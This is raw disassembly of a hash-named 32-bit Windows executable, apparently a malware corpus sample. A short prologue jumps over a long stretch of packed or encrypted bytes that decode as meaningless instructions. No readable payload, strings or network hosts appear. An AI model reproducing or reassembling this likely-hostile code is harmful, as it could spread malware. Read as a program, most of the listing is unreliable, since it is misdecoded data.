
afdbfe99ed3ea621e5c23c6fc3aeac3070985aaa403e891fbb38ead5780d8599.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0x393aa08,cl
  401025:	ins    DWORD PTR es:[edi],dx
  401026:	jle    0x4010a6
  401028:	jle    0x4010a8
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    edx,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    BYTE PTR [edi+0x0],dh
  40103d:	rdpmc  
  40103f:	xadd   BYTE PTR [eax],bl
  401042:	(bad)  
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0x1bebb5a5
  4010d8:	and    BYTE PTR [ebp+0x60e9707f],dh
  4010de:	pushf  
  4010df:	sub    eax,0x3987a81d
  4010e4:	mov    ds:0xcf17ebbc,eax
  4010e9:	dec    ebx
  4010ea:	fcmovnu st,st(6)
  4010ec:	xor    eax,0x2422d180
  4010f1:	add    al,0x34
  4010f3:	push   es
  4010f4:	js     0x401127
  4010f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010f7:	mov    DWORD PTR [ebx+0x79],ebp
  4010fa:	(bad)  
  4010fb:	out    dx,al
  4010fc:	ss fwait
  4010fe:	mov    DWORD PTR [eax+ecx*2],edi
  401101:	jb     0x40112a
  401103:	leave  
  401104:	sbb    BYTE PTR [ecx-0x2e7fd8d7],cl
  40110a:	(bad)  
  40110b:	push   ebp
  40110c:	(bad)  [edx]
  40110e:	rcr    BYTE PTR [edx],0xfd
  401111:	ret    
  401112:	aas    
  401113:	aas    
  401114:	pop    eax
  401115:	dec    ecx
  401116:	mov    eax,ds:0x22835378
  40111b:	dec    edx
  40111c:	enter  0x15d6,0x90
  401120:	mul    BYTE PTR [edi]
  401122:	adc    bl,BYTE PTR [eax]
  401124:	mov    ebp,0x759c4065
  401129:	xchg   edi,eax
  40112a:	xor    eax,0xfea29fe2
  40112f:	jp     0x4010ea
  401131:	shl    DWORD PTR [eax],0x93
  401134:	in     eax,dx
  401135:	adc    ecx,DWORD PTR [ebx+0xdd0e752]
  40113b:	add    al,0xc0
  40113d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40113e:	sbb    edx,edx
  401140:	or     BYTE PTR [ebx],al
  401142:	(bad)  
  401143:	test   DWORD PTR [eax+0x1f],ecx
  401146:	test   BYTE PTR [ebx-0x6d],dh
  401149:	idiv   DWORD PTR [edx+0x1c]
  40114c:	inc    ecx
  40114d:	cli    
  40114e:	mov    esp,0x1e4a30f9
  401153:	das    
  401154:	jne    0x401134
  401156:	xchg   esp,eax
  401157:	sub    cl,dh
  401159:	dec    ebx
  40115a:	sub    bh,ah
  40115c:	rol    BYTE PTR [ecx+0x15012774],1
  401162:	fadd   QWORD PTR [edx]
  401164:	inc    eax
  401165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401166:	mov    ebp,0xe333b384
  40116b:	mov    al,ds:0x9cda4b90
  401170:	and    ebx,DWORD PTR [edx+0x6491b3c0]
  401176:	cli    
  401177:	adc    BYTE PTR [eax-0x26a0ace5],al
  40117d:	int    0x6f
  40117f:	ds cmp ax,0x36f2
  401184:	(bad)  
  401186:	mov    dl,0x26
  401188:	aas    
  401189:	rcr    BYTE PTR [ebx+0x49],1
  40118c:	ror    DWORD PTR ds:0x363a3686,0x2a
  401193:	(bad)  
  401195:	(bad)  
  401196:	jae    0x4011cd
  401198:	or     al,0x19
  40119a:	push   cs
  40119b:	or     DWORD PTR [esi],0x30bd5bb3
  4011a1:	sbb    ah,BYTE PTR [esi+0x23ee40aa]
  4011a7:	(bad)  
  4011a8:	(bad)  
  4011aa:	or     ch,BYTE PTR [edi]
  4011ac:	sub    eax,0x4ed29ca8
  4011b1:	jecxz  0x4011ca
  4011b3:	mov    ebp,0x8bbe2770
  4011b8:	pop    ebx
  4011b9:	fwait
  4011ba:	test   al,0xe5
  4011bc:	jb     0x4011f3
  4011be:	fwait
  4011bf:	xor    BYTE PTR [ebp+0x2],0x9
  4011c3:	in     eax,0xcb
  4011c5:	mov    edi,0xac2b68cf
  4011ca:	lea    edi,es:[ecx+esi*4-0x79]
  4011cf:	mov    edx,0x43213b61
  4011d4:	jns    0x401190
  4011d6:	out    dx,al
  4011d7:	ror    DWORD PTR [esi+0x7d],cl
  4011da:	adc    edi,esp
  4011dc:	popa   
  4011dd:	jne    0x40117b
  4011df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011e0:	imul   esp,esp,0xffffffa3
  4011e3:	add    esi,ebp
  4011e5:	xchg   edx,eax
  4011e6:	add    edi,DWORD PTR [edi+0x51e83fcd]
  4011ec:	loope  0x40118c
  4011ee:	adc    DWORD PTR [edx-0x5fd4cffa],ecx
  4011f4:	xor    dh,bh
  4011f6:	or     al,0xe7
  4011f8:	in     eax,dx
  4011f9:	out    dx,eax
  4011fa:	fwait
  4011fb:	out    0x64,eax
  4011fd:	pop    ebx
  4011fe:	cmp    ecx,DWORD PTR [ebp+0x7ac3eb82]
  401204:	addr16 fdivp st(0),st
  401207:	pushf  
  401208:	jge    0x4011b2
  40120a:	sahf   
  40120b:	add    BYTE PTR [esi-0x2bfef62],bh
  401211:	popf   
  401212:	xor    BYTE PTR [esi+0x69],al
  401215:	pop    ebp
  401216:	cdq    
  401217:	rol    dl,cl
  401219:	mov    edx,gs
  40121b:	push   0x340e73d
  401220:	mov    eax,0x947fc5b7
  401225:	jp     0x4011b2
  401227:	xchg   edi,eax
  401228:	dec    ecx
  401229:	or     BYTE PTR ds:0xcb42138d,0x60
  401230:	mov    dh,0x4e
  401232:	repnz add edi,edi
  401235:	scas   al,BYTE PTR es:[edi]
  401236:	cmp    esp,DWORD PTR ds:0x83049f28
  40123c:	ret    
  40123d:	lods   al,BYTE PTR ds:[esi]
  40123e:	mov    edx,0x124284f1
  401243:	mov    eax,ds:0xe79bb675
  401248:	sbb    al,0x97
  40124a:	popf   
  40124b:	add    eax,0xf5f3e57d
  401250:	xor    ebx,eax
  401252:	push   ebp
  401253:	cmp    al,0xf1
  401255:	retf   
  401256:	mov    al,ds:0xaa9a1f7
  40125b:	imul   ecx,DWORD PTR [edx],0xb2e8c427
  401261:	loope  0x4012cb
  401263:	loop   0x4012ca
  401265:	xchg   ebp,eax
  401266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401267:	sub    DWORD PTR [edi+eiz*4+0x4ef601c6],ebx
  40126e:	or     DWORD PTR [eax],eax
  401270:	iret   
  401271:	retf   0x2ce8
  401274:	inc    DWORD PTR [eax-0x46c5d139]
  40127a:	cmp    bl,BYTE PTR [ecx+0x27]
  40127d:	(bad)  
  40127e:	mov    eax,gs:0xe0fbe43c
  401284:	and    DWORD PTR [esi+0x11f3668],ecx
  40128a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40128b:	sbb    DWORD PTR [edi+0x6f],ebp
  40128e:	neg    DWORD PTR [esi-0x31]
  401291:	repnz sbb eax,0x4ab1300c
  401297:	xchg   BYTE PTR [esi-0x240ae957],bh
  40129d:	inc    edi
  40129e:	imul   esi,DWORD PTR [esi+0x29b95844],0xffffffd2
  4012a5:	and    al,0xab
  4012a7:	js     0x401298
  4012a9:	sbb    ch,bh
  4012ab:	aad    0x56
  4012ad:	push   ss
  4012ae:	into   
  4012af:	stos   BYTE PTR es:[edi],al
  4012b0:	aad    0x27
  4012b2:	dec    eax
  4012b3:	repz pop esi
  4012b5:	test   eax,eax
  4012b7:	sbb    eax,0xbc38b123
  4012bc:	dec    ebx
  4012bd:	aam    0xa1
  4012bf:	mov    BYTE PTR [esp+ebx*4],al
  4012c2:	add    al,0x7a
  4012c4:	daa    
  4012c5:	mov    ecx,0xb2b8868c
  4012ca:	inc    eax
  4012cb:	pop    ebp
  4012cc:	pop    ebp
  4012cd:	(bad)  [esi-0x68]
  4012d0:	sbb    al,BYTE PTR [ebx+0x28]
  4012d3:	mov    esi,DWORD PTR [edi+0x4bf0cd58]
  4012d9:	sbb    al,0x41
  4012db:	scas   eax,DWORD PTR es:[edi]
  4012dc:	loop   0x40131a
  4012de:	mov    dl,0x68
  4012e0:	int3   
  4012e1:	add    ecx,ebp
  4012e3:	jp     0x40133f
  4012e5:	dec    edx
  4012e6:	imul   edi,eax,0x8f0132d9
  4012ec:	xchg   esi,eax
  4012ed:	fs sahf 
  4012ef:	hlt    
  4012f0:	pop    ebp
  4012f1:	daa    
  4012f2:	push   ecx
  4012f3:	or     BYTE PTR [ebx-0x1e],bl
  4012f6:	xor    ch,bh
  4012f8:	pop    ebp
  4012f9:	and    eax,0xa7c09872
  4012fe:	push   ds
  4012ff:	idiv   DWORD PTR [ecx+edi*2-0x61]
  401303:	mov    al,0x3c
  401305:	mov    ebp,0x59f3d495
  40130a:	cmp    eax,0x3b920562
  40130f:	mov    BYTE PTR [edi],cl
  401311:	adc    eax,0x4b381826
  401316:	call   0x60a2:0x9e390173
  40131d:	ret    0x9dfb
  401320:	daa    
  401321:	mov    edx,0x8ff552e8
  401326:	xor    ch,BYTE PTR [edx-0x37be105a]
  40132c:	fstp   TBYTE PTR [ecx]
  40132e:	mov    dl,0x49
  401330:	mov    ds:0x5029d236,eax
  401335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401336:	pop    edi
  401337:	push   edi
  401338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401339:	dec    edi
  40133a:	adc    dh,BYTE PTR [ebp-0x7d]
  40133d:	jnp    0x40139e
  40133f:	pop    DWORD PTR ds:0xef48aced
  401345:	lods   eax,DWORD PTR ds:[esi]
  401346:	das    
  401347:	jno    0x4012fc
  401349:	sti    
  40134a:	out    0x84,eax
  40134c:	jbe    0x4013ca
  40134e:	mov    ch,0x9b
  401350:	cs jecxz 0x401376
  401353:	mov    ss:0x6659156d,eax
  401359:	cmp    esp,DWORD PTR [edx]
  40135b:	xchg   ecx,eax
  40135c:	mov    ds:0x9d549539,al
  401361:	xchg   edi,eax
  401362:	psubw  mm1,QWORD PTR [ebx-0x11d84bca]
  401369:	lds    eax,FWORD PTR [ecx+0x2b]
  40136c:	enter  0x86d8,0x55
  401370:	xchg   BYTE PTR [ebx],bh
  401372:	shl    DWORD PTR [esi+edx*8+0x2e],1
  401376:	aad    0x49
  401378:	lock jnp 0x40134a
  40137b:	jle    0x40138f
  40137d:	add    BYTE PTR [edi+ebp*2+0x66],al
  401381:	sub    eax,0xbaff0119
  401386:	dec    esp
  401387:	adc    al,0x52
  401389:	in     al,dx
  40138a:	mov    ecx,0x3265da61
  40138f:	mov    eax,0x6a33cdfd
  401394:	mov    bl,0x9
  401396:	leave  
  401397:	jo     0x40131d
  401399:	repnz or bh,BYTE PTR [eax]
  40139c:	pop    edi
  40139d:	fsub   DWORD PTR [ecx+0x55bb2028]
  4013a3:	icebp  
  4013a4:	ins    BYTE PTR es:[edi],dx
  4013a5:	ficom  WORD PTR [edx]
  4013a7:	xlat   BYTE PTR ds:[ebx]
  4013a8:	push   es
  4013a9:	inc    ecx
  4013aa:	shl    DWORD PTR [edx-0x22],1
  4013ad:	sub    DWORD PTR [esi+0x36209d97],ecx
  4013b3:	pop    ds
  4013b4:	or     DWORD PTR [edx+0x27b09807],esp
  4013ba:	pop    esp
  4013bb:	push   ecx
  4013bc:	push   0xffffffb3
  4013be:	sbb    DWORD PTR [esi],edx
  4013c0:	jl     0x401437
  4013c2:	scas   eax,DWORD PTR es:[edi]
  4013c3:	arpl   sp,bx
  4013c5:	jp     0x4013f4
  4013c7:	aam    0x1b
  4013c9:	pop    ebx
  4013ca:	xchg   edi,eax
  4013cb:	ins    DWORD PTR es:[edi],dx
  4013cc:	sub    BYTE PTR [eax-0x39700dff],cl
  4013d2:	jg     0x4013a0
  4013d4:	enter  0x2d93,0xc
  4013d8:	int3   
  4013d9:	mov    edx,DWORD PTR [esi-0x52f0be48]
  4013df:	test   al,0x63
  4013e1:	ins    BYTE PTR es:[edi],dx
  4013e2:	shr    BYTE PTR [esi],cl
  4013e4:	adc    eax,0xcc3b66e2
  4013e9:	iret   
  4013ea:	shl    DWORD PTR [esi+0x5],0xe9
  4013ee:	scas   eax,DWORD PTR es:[edi]
  4013ef:	leave  
  4013f0:	gs adc al,0x53
  4013f3:	cmp    al,0x62
  4013f5:	pop    ss
  4013f6:	fnstsw WORD PTR [ecx]
  4013f8:	push   0xf65ec499
  4013fd:	les    eax,FWORD PTR [ecx]
  4013ff:	mov    al,0x20
  401401:	retf   0x1b43
  401404:	sahf   
  401405:	mov    WORD PTR [eax],cs
  401407:	test   DWORD PTR [esi-0x7834011d],0xed12f0d4
  401411:	xchg   ecx,eax
  401412:	mov    ecx,0xefe3f951
  401417:	leave  
  401418:	jae    0x401459
  40141a:	jle    0x4013b4
  40141c:	pop    edi
  40141d:	cli    
  40141e:	pop    ebp
  40141f:	mov    eax,ds:0x413cee
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43364b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433673,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4336eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4336f3
  401461:	sbb    DWORD PTR ds:0x4336ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433743,0x1c
  401476:	cmp    DWORD PTR ds:0x433743,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433743,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433743
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433743,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    ebx,ecx
  4014c2:	hlt    
  4014c3:	xor    DWORD PTR ds:0x7e7e7d6f,ecx
  4014c9:	outs   dx,DWORD PTR ds:[esi]
  4014ca:	jge    0x40154a
  4014cc:	jle    0x40151c
  4014ce:	mov    esi,0x4f547b13
  4014d3:	enter  0x805d,0x39
  4014d7:	(bad)  
  4014d8:	fcomp  QWORD PTR [esi-0x7c]
  4014db:	sub    eax,0x12883a0
  4014e0:	sub    BYTE PTR fs:[eax+0x25],ah
  4014e4:	(bad)  
  4014e5:	cmp    bl,BYTE PTR [esi]
  4014e7:	ret    0x4208
  4014ea:	lds    esi,FWORD PTR [edx]
  4014ec:	imul   ebp,DWORD PTR [ebp+edx*1+0x152dca03],0xe0fa9af9
  4014f7:	lea    eax,[edi+0x4c]
  4014fa:	div    DWORD PTR [ebx-0x744782ba]
  401500:	xchg   ecx,eax
  401501:	jmp    0x4014d2
  401503:	call   0xdbf5:0xf70c5071
  40150a:	xor    BYTE PTR [ebx+0xe4efd45],0xec
  401511:	in     al,dx
  401512:	pusha  
  401513:	xchg   edi,eax
  401514:	ds test eax,0x61c42b0c
  40151a:	pop    ebp
  40151b:	fdivr  QWORD PTR [edx+0x1f]
  40151e:	lahf   
  40151f:	jns    0x4014fd
  401521:	sub    al,0x85
  401523:	sbb    bl,BYTE PTR [ebx+0x3398c767]
  401529:	xor    BYTE PTR [eax+0x2f5925f5],bh
  40152f:	add    al,BYTE PTR [edi+0x47490f16]
  401535:	inc    esi
  401536:	push   ss
  401537:	rol    ecx,0x88
  40153a:	cmp    eax,0xcccac326
  40153f:	pop    eax
  401540:	shl    ah,1
  401542:	cwde   
  401543:	je     0x4014dc
  401545:	push   0x2a
  401547:	sub    BYTE PTR [esp+ebx*4-0x8],ch
  40154b:	in     eax,dx
  40154c:	adc    dh,BYTE PTR [ebx+ecx*8+0x34]
  401550:	ror    cl,1
  401552:	jns    0x4015c5
  401554:	icebp  
  401555:	aas    
  401556:	(bad)  
  401557:	mov    ecx,0xd3045a1
  40155c:	pop    edi
  40155d:	xor    DWORD PTR [ebx+0x7f],esi
  401560:	add    eax,0x454cc4ee
  401565:	mov    ds:0x93fc748b,eax
  40156a:	push   es
  40156b:	xchg   ecx,eax
  40156c:	sub    edi,ebp
  40156e:	and    BYTE PTR [ebx-0x14],bl
  401571:	jg     0x40157c
  401573:	lods   eax,DWORD PTR ds:[esi]
  401574:	(bad)  
  401575:	push   ebp
  401576:	dec    edi
  401577:	pop    eax
  401578:	mov    eax,0x6db6b7e9
  40157d:	xchg   ecx,eax
  40157e:	aaa    
  40157f:	sub    esp,DWORD PTR [eax+0x366ab89]
  401585:	mov    bh,0x2
  401587:	scas   al,BYTE PTR es:[edi]
  401588:	hlt    
  401589:	pop    es
  40158a:	repz pop es
  40158c:	call   0x2688:0x67b1f013
  401593:	dec    ebx
  401594:	jb     0x4015bf
  401596:	test   DWORD PTR [ebp+0x76],ecx
  401599:	fnstcw WORD PTR [eax-0x4]
  40159c:	shl    edx,1
  40159e:	scas   al,BYTE PTR es:[edi]
  40159f:	dec    esi
  4015a0:	and    al,0x64
  4015a2:	sbb    eax,0x94a90056
  4015a7:	pop    ss
  4015a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015a9:	jno    0x4015a7
  4015ab:	stos   BYTE PTR es:[edi],al
  4015ac:	mov    cl,0x9e
  4015ae:	inc    esp
  4015af:	sbb    al,0x4d
  4015b1:	lods   eax,DWORD PTR ds:[esi]
  4015b2:	inc    edi
  4015b3:	aad    0xc7
  4015b5:	test   al,0x56
  4015b7:	into   
  4015b8:	sbb    ecx,esi
  4015ba:	loope  0x4015ff
  4015bc:	out    dx,eax
  4015bd:	ins    BYTE PTR es:[edi],dx
  4015be:	stc    
  4015bf:	and    BYTE PTR [ebx+0x1a],cl
  4015c2:	sub    BYTE PTR [eax+edi*4-0x7d0fc64],cl
  4015c9:	adc    eax,0xb61c5de8
  4015ce:	mov    eax,ds:0x586724a
  4015d3:	jne    0x401555
  4015d5:	aam    0xe4
  4015d7:	sub    al,0xb
  4015d9:	cmp    ebx,DWORD PTR [edi+0xa]
  4015dc:	scas   al,BYTE PTR es:[edi]
  4015dd:	repz jo 0x4015b2
  4015e0:	add    eax,0x9227ccc3
  4015e5:	mov    bh,0x2e
  4015e7:	mov    dl,0x3e
  4015e9:	outs   dx,DWORD PTR ds:[esi]
  4015ea:	int3   
  4015eb:	lds    esi,FWORD PTR [ebx-0x525ff78f]
  4015f1:	push   es
  4015f2:	pop    edx
  4015f3:	repnz adc ah,cl
  4015f6:	sbb    al,0x15
  4015f8:	gs ds dec ebx
  4015fb:	push   ss
  4015fc:	inc    DWORD PTR [edi+esi*2]
  4015ff:	push   eax
  401600:	or     DWORD PTR [ebp-0x4d381286],esi
  401606:	pushf  
  401607:	call   DWORD PTR [edx+0x606bbd7f]
  40160d:	(bad)  
  40160e:	dec    edi
  40160f:	xchg   edi,eax
  401610:	cmp    eax,0xa796ea8b
  401615:	outs   dx,DWORD PTR ds:[esi]
  401616:	jge    0x4015f9
  401618:	imul   BYTE PTR [esp+ebp*1-0x18f734dd]
  40161f:	or     DWORD PTR [ebx-0x76],ebx
  401622:	cmc    
  401623:	test   BYTE PTR [esi-0x4c],dh
  401626:	rol    BYTE PTR [edi-0x63],1
  401629:	into   
  40162a:	ja     0x401664
  40162c:	jb     0x4015bf
  40162e:	dec    ebx
  40162f:	inc    eax
  401630:	mov    al,0xb6
  401632:	dec    esi
  401633:	fdivr  st(1),st
  401635:	and    DWORD PTR [edi+0x77],0xb43e6d6d
  40163c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40163d:	sub    BYTE PTR [edx-0x54],dh
  401640:	cmp    DWORD PTR [ebp+0x45012c39],eax
  401646:	dec    ebp
  401647:	in     al,0x66
  401649:	cmp    cl,BYTE PTR [edx+0x15]
  40164c:	out    0xb6,eax
  40164e:	scas   al,BYTE PTR es:[edi]
  40164f:	or     DWORD PTR [edi+0xe],ecx
  401652:	jne    0x4016be
  401654:	sbb    al,0x6f
  401656:	test   DWORD PTR [edi+eax*8-0x56b289ba],ecx
  40165d:	jmp    0xe444559c
  401662:	jnp    0x4015f7
  401664:	adc    DWORD PTR [eax-0x7d],eax
  401667:	(bad)  [ecx-0x1a]
  40166a:	adc    eax,0xb898d7b8
  40166f:	xchg   esp,eax
  401670:	sbb    esp,ebp
  401672:	xchg   esi,eax
  401673:	loop   0x401649
  401675:	loope  0x401609
  401677:	xor    DWORD PTR [edx+0x668a83e1],edx
  40167d:	mov    ebx,0xd7907d9b
  401682:	cmc    
  401683:	fild   QWORD PTR [esi-0x5]
  401686:	xlat   BYTE PTR ds:[ebx]
  401687:	hlt    
  401688:	sbb    BYTE PTR ds:0xef80f7a,bh
  40168e:	stos   DWORD PTR es:[edi],eax
  40168f:	mov    dl,0x42
  401691:	adc    ebp,DWORD PTR [ebx+0x12]
  401694:	cwde   
  401695:	jo     0x40166d
  401697:	cmp    cl,BYTE PTR [eax]
  401699:	push   ebp
  40169a:	popf   
  40169b:	imul   edi,esp,0x9df699ad
  4016a1:	and    al,0xf9
  4016a3:	dec    esp
  4016a4:	aam    0xf5
  4016a6:	test   ch,bh
  4016a8:	cmp    dh,BYTE PTR [eax+0x31]
  4016ab:	aad    0x2
  4016ad:	fidivr DWORD PTR [esi]
  4016af:	jg     0x40165f
  4016b1:	outs   dx,BYTE PTR ds:[esi]
  4016b2:	jo     0x401717
  4016b4:	inc    BYTE PTR [eax]
  4016b6:	and    al,0x51
  4016b8:	imul   eax,DWORD PTR [ebp-0x8],0x78362e9a
  4016bf:	fnstenv [esi+edi*4+0x578aadee]
  4016c6:	rol    BYTE PTR [ebp+0x6f],0xfc
  4016ca:	sbb    ah,BYTE PTR [edx]
  4016cc:	add    edx,DWORD PTR [edx]
  4016ce:	xor    eax,0x7c8b722a
  4016d3:	sbb    esi,esi
  4016d5:	cmp    dh,BYTE PTR [esi+0x78b27d4a]
  4016db:	(bad)  
  4016dc:	fisub  WORD PTR [edx-0x33]
  4016df:	push   ss
  4016e0:	test   DWORD PTR [eax],ebp
  4016e2:	ja     0x401748
  4016e4:	dec    ebp
  4016e5:	in     al,0x1f
  4016e7:	mov    esi,0x433562d
  4016ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016ed:	hlt    
  4016ee:	xchg   edi,eax
  4016ef:	aas    
  4016f0:	pop    esi
  4016f1:	imul   edx,DWORD PTR [edx+0x4bc128aa],0x7d
  4016f8:	jne    0x40176f
  4016fa:	jp     0x40171e
  4016fc:	xchg   dh,cl
  4016fe:	ins    DWORD PTR es:[edi],dx
  4016ff:	mov    bl,0xac
  401701:	push   ebx
  401702:	hlt    
  401703:	pop    edx
  401704:	ja     0x40171f
  401706:	out    0x3,al
  401708:	lea    esp,[edx-0x9]
  40170b:	fs xor ebp,edi
  40170e:	inc    edi
  40170f:	(bad)  [edi+0x5a]
  401712:	or     edx,DWORD PTR [ecx]
  401714:	xlat   BYTE PTR ds:[ebx]
  401715:	jno    0x4016e7
  401717:	and    BYTE PTR [edi-0x49986fe0],al
  40171d:	sbb    bh,BYTE PTR [ebx]
  40171f:	(bad)  
  401720:	mov    ebx,0xd27679b2
  401725:	push   DWORD PTR [ecx+0x72]
  401728:	into   
  401729:	gs in  al,0x32
  40172c:	mov    edx,0x75cee797
  401731:	fwait
  401732:	jns    0x401718
  401734:	push   0x64
  401736:	nop
  401737:	and    DWORD PTR [eax+edi*4+0x51],0x535b19d5
  40173f:	aaa    
  401740:	in     eax,0x6f
  401742:	inc    edx
  401743:	xchg   esi,eax
  401744:	xchg   edi,eax
  401745:	(bad)  
  401747:	fwait
  401748:	sahf   
  401749:	cdq    
  40174a:	mov    ebp,0xc16095fc
  40174f:	xor    al,0x8b
  401751:	or     al,0xe7
  401753:	js     0x4017a2
  401755:	xchg   esp,eax
  401756:	sub    BYTE PTR [edx],dl
  401758:	aas    
  401759:	and    ch,BYTE PTR [esi-0x3d8dcd1a]
  40175f:	into   
  401760:	fwait
  401761:	mov    al,ds:0xfce9b76c
  401766:	rol    DWORD PTR [ebx-0x5158f49c],cl
  40176c:	leave  
  40176d:	sbb    bh,dh
  40176f:	cld    
  401770:	xor    al,0x14
  401772:	loope  0x401778
  401774:	jp     0x40177b
  401776:	add    eax,0x6f850a35
  40177b:	xor    esp,eax
  40177d:	loope  0x40179a
  40177f:	jmp    0x4017e4
  401781:	inc    ecx
  401782:	test   edi,ecx
  401784:	cmc    
  401785:	jmp    0x4773c19b
  40178a:	jb     0x401769
  40178c:	loope  0x4017b7
  40178e:	inc    eax
  40178f:	and    eax,0x68f09ce3
  401794:	loope  0x4017e5
  401796:	in     eax,0x10
  401798:	lds    ecx,FWORD PTR [eax+edi*8+0x14]
  40179c:	in     eax,0x5a
  40179e:	dec    ebp
  40179f:	inc    ecx
  4017a0:	pop    esp
  4017a1:	jge    0x401735
  4017a3:	sbb    ah,BYTE PTR [eax]
  4017a5:	shr    BYTE PTR [eax-0x2e3bd712],cl
  4017ab:	(bad)  
  4017ad:	and    esi,esp
  4017af:	in     al,dx
  4017b0:	push   esp
  4017b1:	push   ebp
  4017b2:	push   ss
  4017b3:	push   edx
  4017b4:	or     BYTE PTR fs:[esi+0x53134d1b],ah
  4017bb:	nop
  4017bc:	lods   al,BYTE PTR ds:[esi]
  4017bd:	cmp    edx,DWORD PTR [eax-0x456381a7]
  4017c3:	shl    DWORD PTR [ebx+eiz*2],1
  4017c6:	xchg   ebp,eax
  4017c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c8:	push   ss
  4017c9:	and    eax,esi
  4017cb:	mov    ebp,0x9934b228
  4017d0:	lock ss jns 0x40181c
  4017d4:	jp     0x401783
  4017d6:	nop
  4017d7:	cmp    ebp,ecx
  4017d9:	loope  0x401856
  4017db:	shl    BYTE PTR [ebx-0xe4fbe58],cl
  4017e1:	fdiv   st,st(1)
  4017e3:	dec    ebx
  4017e4:	shld   DWORD PTR [edx+0x24782abd],ebx,cl
  4017eb:	enter  0xb077,0x7
  4017ef:	mov    edi,0x16c743ce
  4017f4:	lds    edi,FWORD PTR [eax+0x2b7fec38]
  4017fa:	add    eax,0x99f91cd5
  4017ff:	mov    ah,0x3c
  401801:	das    
  401802:	pop    ebx
  401803:	lahf   
  401804:	mov    ebx,DWORD PTR [ebx+0x4b38b68f]
  40180a:	sbb    edi,0x39
  40180d:	inc    esp
  40180e:	xchg   edi,eax
  40180f:	cdq    
  401810:	cld    
  401811:	fadd   st,st(1)
  401813:	ficomp WORD PTR [edx-0x7b]
  401816:	pusha  
  401817:	outs   dx,BYTE PTR ds:[esi]
  401818:	std    
